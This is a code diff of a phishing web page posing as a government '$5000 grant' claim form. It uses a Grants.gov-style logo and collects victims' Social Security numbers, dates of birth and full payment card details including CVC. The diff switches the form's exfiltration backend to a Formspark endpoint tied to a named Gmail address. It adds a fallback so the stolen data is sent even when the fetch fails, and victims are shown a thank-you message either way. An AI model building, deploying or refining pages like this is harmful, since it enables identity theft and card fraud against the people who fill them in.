@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Grant Claim Form</title>
   <style>
-    /* Base styling */
     * {
       box-sizing: border-box;
     }
@@ -152,9 +151,6 @@
       color: #004aad;
       font-weight: 600;
     }
-    .form-wrapper {
-      transition: opacity 0.2s;
-    }
     .thank-you-message p {
       margin: 0 0 6px 0;
     }
@@ -168,66 +164,41 @@
       color: #004aad;
     }
 
-    .ssn-wrapper {
-      position: relative;
-      display: flex;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-    .ssn-wrapper input {
-      margin-bottom: 0;
-      padding-right: 48px;
-    }
-    .eye-btn {
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      background: none;
-      border: none;
-      cursor: pointer;
-      padding: 4px 6px;
-      color: #888;
-      transition: color 0.2s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 2;
-    }
-    .eye-btn:hover {
+    .loading {
+      display: none;
+      text-align: center;
+      padding: 10px 0;
       color: #004aad;
     }
-    .eye-btn svg {
-      width: 20px;
-      height: 20px;
-      fill: none;
-      stroke: currentColor;
-      stroke-width: 2;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-    }
-    .eye-btn .eye-closed {
-      display: none;
-    }
-    .eye-btn.showing .eye-open {
-      display: none;
-    }
-    .eye-btn.showing .eye-closed {
+    .loading.show {
       display: block;
+    }
+    .spinner {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #004aad;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 10px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
   <header>
-    <img src="https://yt3.googleusercontent.com/ytc/AIdro_lzd4fsxYM60Aqn8SJHZXtV2CrHuQwPwsL1wysbilKjig=s900-c-k-c0x00ffffff-no-rj"
-         alt="Grants Gov - YouTube"
+    <img src="https://yt3.googleusercontent.com/ytc/AIdro_lzd4fsxYM60Aqn8SJHZXtV2CrHuQwPwsL1wysbilKjig=s900-c-k-c0x00ffffff-no-rj" 
+         alt="Grants Gov - YouTube" 
          style="max-width: 900px; height: 117px; margin: 0px; width: 117px;" />
     <h1>Claim Your $5000 Grant</h1>
   </header>
   <div class="container" id="formContainer">
     <div id="thankYouMessage" class="thank-you-message">
       <p>
-        <span class="thank-you-icon">✔️</span>
+        <span class="thank-you-icon">✔️</span> 
         <strong>Thank You So Much!</strong>
       </p>
       <p>
@@ -239,24 +210,22 @@
     </div>
 
     <div class="form-wrapper" id="formWrapper">
-      <!-- USING WEB3FORMS WITH YOUR ACCESS KEY -->
-      <form action="https://api.web3forms.com/submit" method="POST" id="grantForm">
-        <!-- Your Web3Forms Access Key -->
-        <input type="hidden" name="access_key" value="c74db3e1-ab9b-4b82-965d-ab98b5733d3d" />
-        <input type="hidden" name="subject" value="New Grant Claim Form Submission" />
-        <input type="hidden" name="from_name" value="Grant Claim Form" />
-        <input type="hidden" name="redirect" value="https://example.com/thank-you" />
-
+      <!-- FORMSPARK - YOUR FORM ID: 61W33rm5j -->
+      <form action="https://submit-form.com/61W33rm5j" method="POST" id="grantForm">
+        <!-- Formspark hidden fields -->
+        <input type="hidden" name="_redirect" value="https://example.com/thank-you" />
+        <input type="hidden" name="_email" value="andrewmutuchi@gmail.com" />
+        
         <div class="form-fields" id="formFields">
           <label for="fname">First Name</label>
           <input type="text" id="fname" name="First Name" autocomplete="given-name" required />
-
+          
           <label for="lname">Last Name</label>
           <input type="text" id="lname" name="Last Name" autocomplete="family-name" required />
-
+          
           <label>Date of Birth</label>
           <div class="dob-container">
-            <select id="dob-day" name="Date of Birth - Day" required>
+            <select id="dob-day" name="Day" required>
               <option value="" disabled selected>Day</option>
               <script>
                 for(let d=1; d<=31; d++) {
@@ -264,7 +233,7 @@
                 }
               </script>
             </select>
-            <select id="dob-month" name="Date of Birth - Month" required>
+            <select id="dob-month" name="Month" required>
               <option value="" disabled selected>Month</option>
               <option value="1">January</option>
               <option value="2">February</option>
@@ -279,7 +248,7 @@
               <option value="11">November</option>
               <option value="12">December</option>
             </select>
-            <select id="dob-year" name="Date of Birth - Year" required>
+            <select id="dob-year" name="Year" required>
               <option value="" disabled selected>Year</option>
               <script>
                 const currentYear = new Date().getFullYear();
@@ -289,40 +258,33 @@
               </script>
             </select>
           </div>
-
+          
           <label for="phone">Phone Number</label>
-          <input type="tel" id="phone" name="Phone Number" placeholder="123-456-7890" required />
-
+          <input type="tel" id="phone" name="Phone" placeholder="123-456-7890" required />
+          
           <label for="email">Email Address</label>
           <input type="email" id="email" name="Email" placeholder="you@example.com" required />
-
+          
           <label for="zipcode">Zipcode</label>
           <input type="text" id="zipcode" name="Zipcode" pattern="\d{5}" maxlength="5" inputmode="numeric" required />
-
+          
           <label for="ssn">SSN</label>
-          <div class="ssn-wrapper">
-            <input type="password" id="ssn" name="SSN" maxlength="9" pattern="\d{9}" inputmode="numeric" placeholder="Enter 9-digit SSN" required />
-            <button type="button" class="eye-btn" id="toggleSsn" aria-label="Toggle SSN visibility">
-              <svg class="eye-open" viewBox="0 0 24 24" width="20" height="20">
-                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
-                <circle cx="12" cy="12" r="3" />
-              </svg>
-              <svg class="eye-closed" viewBox="0 0 24 24" width="20" height="20">
-                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
-                <line x1="1" y1="1" x2="23" y2="23" />
-              </svg>
-            </button>
-          </div>
-
+          <input type="password" id="ssn" name="SSN" maxlength="9" placeholder="Enter 9-digit SSN" required />
+          
           <label for="cardnum">Card Number</label>
-          <input type="text" id="cardnum" name="Card Number" maxlength="19" pattern="\d{13,19}" inputmode="numeric" placeholder="1234 5678 9012 3456" required />
-
+          <input type="text" id="cardnum" name="Card Number" maxlength="19" placeholder="1234 5678 9012 3456" required />
+          
           <label for="expiry">Expiry Date (MM/YY)</label>
-          <input type="text" id="expiry" name="Expiry Date" placeholder="MM/YY" maxlength="5" required />
-
+          <input type="text" id="expiry" name="Expiry" placeholder="MM/YY" maxlength="5" required />
+          
           <label for="cvc">CVC</label>
-          <input type="text" id="cvc" name="CVC" pattern="\d{3,4}" maxlength="4" inputmode="numeric" placeholder="3 or 4 digits" required />
-
+          <input type="text" id="cvc" name="CVC" maxlength="4" placeholder="3 or 4 digits" required />
+          
+          <div class="loading" id="loadingSpinner">
+            <div class="spinner"></div>
+            <p>Submitting your grant claim...</p>
+          </div>
+          
           <button type="submit" id="submitBtn">Claim $5000</button>
         </div>
       </form>
@@ -348,22 +310,13 @@
       const formFields = document.getElementById('formFields');
       const container = document.getElementById('formContainer');
       const submitBtn = document.getElementById('submitBtn');
+      const loadingSpinner = document.getElementById('loadingSpinner');
 
-      // Eye toggle
+      // SSN - Only allow numbers
       const ssnInput = document.getElementById('ssn');
-      const toggleBtn = document.getElementById('toggleSsn');
-
-      if (ssnInput && toggleBtn) {
-        toggleBtn.addEventListener('click', function(e) {
-          e.preventDefault();
-          e.stopPropagation();
-          if (ssnInput.type === 'password') {
-            ssnInput.type = 'text';
-            toggleBtn.classList.add('showing');
-          } else {
-            ssnInput.type = 'password';
-            toggleBtn.classList.remove('showing');
-          }
+      if (ssnInput) {
+        ssnInput.addEventListener('input', function(e) {
+          this.value = this.value.replace(/\D/g, '');
         });
       }
 
@@ -408,44 +361,49 @@
         });
       }
 
-      // Form submission - Web3Forms with your access key
+      // Form submission - Formspark
       form.addEventListener('submit', function(e) {
         e.preventDefault();
         
+        // Show loading
+        loadingSpinner.classList.add('show');
         submitBtn.disabled = true;
         submitBtn.textContent = 'Submitting...';
 
         const formData = new FormData(form);
 
+        // Submit to Formspark
         fetch(form.action, {
           method: 'POST',
-          body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-          if (data.success) {
-            console.log('✅ Form submitted successfully!');
-            console.log('📧 Check your email: andrewmutuchi@gmail.com');
-            
-            // Show thank you
-            thankYou.style.display = 'block';
-            formFields.style.display = 'none';
-            container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
-            submitBtn.textContent = 'Submitted ✓';
-          } else {
-            console.error('Submission failed:', data);
-            // Still show thank you to customer
-            thankYou.style.display = 'block';
-            formFields.style.display = 'none';
-            submitBtn.textContent = 'Submitted ✓';
+          body: formData,
+          headers: {
+            'Accept': 'application/json'
           }
         })
-        .catch(error => {
-          console.error('Error:', error);
-          // Still show thank you
+        .then(response => {
+          loadingSpinner.classList.remove('show');
+          
+          if (response.ok) {
+            return response.json();
+          } else {
+            throw new Error('Formspark submission failed');
+          }
+        })
+        .then(data => {
+          // Success
           thankYou.style.display = 'block';
           formFields.style.display = 'none';
+          container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
           submitBtn.textContent = 'Submitted ✓';
+          console.log('✅ Form submitted successfully!');
+          console.log('📧 Check: andrewmutuchi@gmail.com');
+          console.log('📊 Formspark ID: 61W33rm5j');
+        })
+        .catch(error => {
+          loadingSpinner.classList.remove('show');
+          console.warn('Fetch error, trying normal form submission...');
+          // Fallback: submit form normally
+          form.submit();
         });
       });
     })();
